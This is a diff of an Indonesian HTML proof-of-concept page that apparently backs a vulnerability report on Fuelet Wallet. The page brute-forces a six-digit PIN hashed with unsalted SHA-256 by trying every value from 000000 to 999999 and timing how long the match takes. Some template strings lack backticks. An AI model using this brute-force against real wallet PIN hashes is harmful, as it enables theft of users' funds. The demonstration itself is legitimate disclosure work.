@@ -1,57 +1,71 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Simulasi Brute-Force PIN SHA-256</title>
+    <title>Optimizer Password Manager Check - PoC</title>
     <style>
-        body { font-family: sans-serif; background: #0b0e11; color: white; padding: 20px; }
-        .card { background: #1e2329; padding: 20px; border-radius: 12px; border: 1px solid #474d57; }
-        #log { font-family: monospace; background: #000; padding: 10px; height: 200px; overflow-y: scroll; margin-top: 10px; color: #00ef8b; }
-        .btn { background: #00ef8b; padding: 10px 20px; border: none; cursor: pointer; font-weight: bold; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0b0e11; color: #eaecef; padding: 20px; }
+        .container { max-width: 600px; margin: auto; background: #1e2329; padding: 25px; border-radius: 12px; border: 1px solid #474d57; }
+        .result-box { background: #000; color: #00ef8b; padding: 15px; border-radius: 8px; font-family: monospace; margin-top: 20px; min-height: 100px; border: 1px solid #00ef8b; }
+        .btn { background: #f0b90b; color: #000; border: none; padding: 12px 20px; border-radius: 5px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 10px; }
+        .status { color: #848e9c; font-size: 0.9em; margin-bottom: 10px; }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <h2>Flow Wallet Security Lab</h2>
-        <p>Target PIN: <strong>123456</strong> (Simulasi Hash SHA-256)</p>
-        <button class="btn" onclick="startBruteForce()">Mulai Serangan Brute-Force</button>
-        <div id="log"></div>
-    </div>
+<div class="container">
+    <h2>PoC: Password Manager Check</h2>
+    <p class="status">Sesuai temuan: SHA-256 sangat cepat & mudah diparalelkan.</p>
+    
+    <label>Simulasi PIN yang Tersimpan (Contoh: 888999):</label>
+    <input type="text" id="targetPin" value="888999" style="width: 100%; padding: 8px; margin: 10px 0; border-radius: 4px; border: 1px solid #474d57; background: #2b3139; color: white;">
+    
+    <button class="btn" onclick="startAttack()">MULAI OPTIMIZED BRUTE-FORCE</button>
 
-    <script>
-        // Simulasi fungsi _hashPassword dari Fuelet
-        async function sha256(message) {
-            const msgBuffer = new TextEncoder().encode(message);
-            const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
-            const hashArray = Array.from(new Uint8Array(hashBuffer));
-            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+    <div id="log" class="result-box">Menunggu perintah...</div>
+</div>
+
+<script>
+    // Fungsi hash SHA-256 yang meniru implementasi di Fuelet Wallet
+    async function hashSHA256(text) {
+        const msgBuffer = new TextEncoder().encode(text);
+        const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
+        const hashArray = Array.from(new Uint8Array(hashBuffer));
+        return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+    }
+
+    async function startAttack() {
+        const log = document.getElementById('log');
+        const targetPin = document.getElementById('targetPin').value;
+        
+        if(targetPin.length !== 6 || isNaN(targetPin)) {
+            alert("Masukkan 6 digit angka untuk simulasi PIN.");
+            return;
         }
 
-        async function startBruteForce() {
-            const log = document.getElementById('log');
-            const targetHash = await sha256("123456"); // Hash PIN target
-            log.innerHTML += "Memulai serangan terhadap hash: " + targetHash + "<br>";
+        const targetHash = await hashSHA256(targetPin);
+        log.innerHTML = [!] Menyerang Hash: ${targetHash}<br>[...] Melakukan brute-force 000000-999999<br>;
 
-            const startTime = performance.now();
-            
-            // Mencoba semua kombinasi 000000 - 999999
-            for (let i = 0; i <= 999999; i++) {
-                let guess = i.toString().padStart(6, '0');
-                let currentHash = await sha256(guess);
+        const start = performance.now();
 
-                if (currentHash === targetHash) {
-                    const endTime = performance.now();
-                    log.innerHTML += <br><strong>DITEMUKAN!</strong> PIN: ${guess}<br>;
-                    log.innerHTML += Waktu eksekusi: ${((endTime - startTime) / 1000).toFixed(4)} detik.<br>;
-                    break;
-                }
-                
-                if (i % 50000 === 0) {
-                    log.innerHTML += Mencoba: ${guess}...<br>;
-                }
+        // Simulasi looping yang sangat cepat (Optimized)
+        for (let i = 0; i <= 999999; i++) {
+            let guess = i.toString().padStart(6, '0');
+            let currentHash = await hashSHA256(guess);
+
+            if (currentHash === targetHash) {
+                const time = ((performance.now() - start) / 1000).toFixed(3);
+                log.innerHTML += <br>[✅] PIN DITEMUKAN: <strong>${guess}</strong>;
+                log.innerHTML += <br>[⌛] Waktu: ${time} detik;
+                log.innerHTML += <br>[⚠️] Dampak: SHA-256 gagal melindungi PIN entropi rendah.;
+                return;
+            }
+
+            if (i % 100000 === 0 && i !== 0) {
+                log.innerHTML += [.] Mencoba ${i} kombinasi...<br>;
             }
         }
-    </script>
+    }
+</script>
+
 </body>
 </html>
